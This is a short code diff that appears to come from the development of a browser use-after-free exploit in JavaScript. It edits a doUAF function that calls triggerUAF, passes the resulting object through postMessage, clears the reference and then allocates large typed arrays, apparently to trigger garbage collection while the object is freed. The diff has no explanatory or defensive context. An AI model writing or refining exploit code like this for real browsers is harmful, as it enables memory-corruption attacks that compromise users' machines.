@@ -57,23 +57,34 @@ function triggerUAF(depth) {
   return recv;
 }*/
 
+ 
 async function doUAF(depth) {
-   let obj = triggerUAF(depth);
+  let obj = triggerUAF(depth);
 
-  
+ 
+  let recv;
+
+ 
   const p = new Promise(r => addEventListener(
     'message',
     e => { recv = e.data; r(); },
     { once: true }
   ));
+
+  
   postMessage(obj, location.origin);
 
- 
+  
   obj = null;
+
+ 
+  for (let i = 0; i < 5; i++) new Uint8Array(8 * MB);
 
  
   await p;
   return recv;
+ 
+
 }
 
 
